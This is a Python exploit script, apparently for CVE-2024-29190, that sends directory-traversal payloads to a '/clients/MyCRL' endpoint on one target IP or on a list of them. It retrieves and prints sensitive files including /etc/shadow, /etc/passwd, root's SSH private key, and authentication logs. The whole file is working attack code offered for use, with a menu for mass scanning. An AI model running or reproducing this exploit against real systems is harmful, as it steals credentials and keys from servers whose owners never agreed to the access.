import requests
from urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init
from requests.exceptions import RequestException, Timeout

init(autoreset=True)

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(ip, path):
    target = f'https://{ip}/clients/MyCRL'
    data = path

    headers = {
        'Host': f'{ip}',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Te': 'trailers',
        'Dnt': '1',
        'Connection': 'keep-alive',
        'Content-Length': str(len(data))
    }

    try:
        response = requests.post(target, headers=headers, data=data, verify=False, timeout=10)

        if response.status_code == 200:
            print(f"{Fore.GREEN}Contents of {path}:")
            print(f"{Fore.BLUE}{response.text}")
        else:
            print(f"{Fore.RED}Failed to access {path}")
    except Timeout:
        print(f"{Fore.RED}Connection timed out for {path}")
    except RequestException as e:
        print(f"{Fore.RED}Request failed for {path}: {e}")

def scan_single_ip(ip, paths):
    for path in paths:
        try:
            exploit(ip, path)
        except EOFError:
            exit(1)
        except KeyboardInterrupt:
            exit(1)

def scan_multiple_ips(file_path, paths):
    with open(file_path, 'r') as file:
        ips = file.read().splitlines()
    
    for ip in ips:
        print(f"{Fore.YELLOW}Scanning IP: {ip}")
        for path in paths:
            target = f'https://{ip}/clients/MyCRL'
            data = path

            headers = {
                'Host': f'{ip}',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0',
                'Te': 'trailers',
                'Dnt': '1',
                'Connection': 'keep-alive',
                'Content-Length': str(len(data))
            }

            try:
                response = requests.post(target, headers=headers, data=data, verify=False, timeout=10)

                if response.status_code == 200:
                    print(f"{Fore.GREEN}{path} ✓")
                else:
                    print(f"{Fore.RED}{path} ✗")
            except Timeout:
                print(f"{Fore.RED}Connection timed out for {path}")
            except RequestException as e:
                print(f"{Fore.RED}Request failed for {path}")

if __name__ == '__main__':
    choice = input(r'''
  _______      ________    ___   ___ ___  _  _        ___  _  _   ___  __  ___  
 / ____\ \    / /  ____|  |__ \ / _ \__ \| || |      |__ \| || | / _ \/_ |/ _ \ 
| |     \ \  / /| |__ ______ ) | | | | ) | || |_ ______ ) | || || (_) || | (_) |
| |      \ \/ / |  __|______/ /| | | |/ /|__   _|______/ /|__   _\__, || |\__, |
| |____   \  /  | |____    / /_| |_| / /_   | |       / /_   | |   / / | |  / / 
 \_____|   \/   |______|  |____|\___/____|  |_|      |____|  |_|  /_/  |_| /_/  
                            github.com/GoatSecurity
                   



1- for single IP scan
2- for multiple IP scan
99- for exit
                   
''')

    paths = [
        'aCSHELL/../../../../../../../../../../../etc/passwd',
        'aCSHELL/../../../../../../../../../../../etc/apache2/apache2.conf',
        'aCSHELL/../../../../../../../../../../../etc/mysql/my.cnf',
        'aCSHELL/../../../../../../../../../../../var/log/syslog',
        'aCSHELL/../../../../../../../../../../../var/log/auth.log',
        #'aCSHELL/../../../../../../../../../../../var/log/messages',
        'aCSHELL/../../../../../../../../../../../etc/group',
        'aCSHELL/../../../../../../../../../../../etc/shadow',
        'aCSHELL/../../../../../../../../../../../root/.ssh/id_rsa',
        'aCSHELL/../../../../../../../../../../../etc/hostname',
        'aCSHELL/../../../../../../../../../../../etc/hosts',
        'aCSHELL/../../../../../../../../../../../etc/resolv.conf'
    ]
    
    if choice == '1':
        ip = input("Please enter the IP address: ")
        scan_single_ip(ip, paths)
    elif choice == '2':
        file_path = input("Please enter the path to the txt file containing IP addresses: ")
        scan_multiple_ips(file_path, paths)
    else:
        print("thanks for using.")
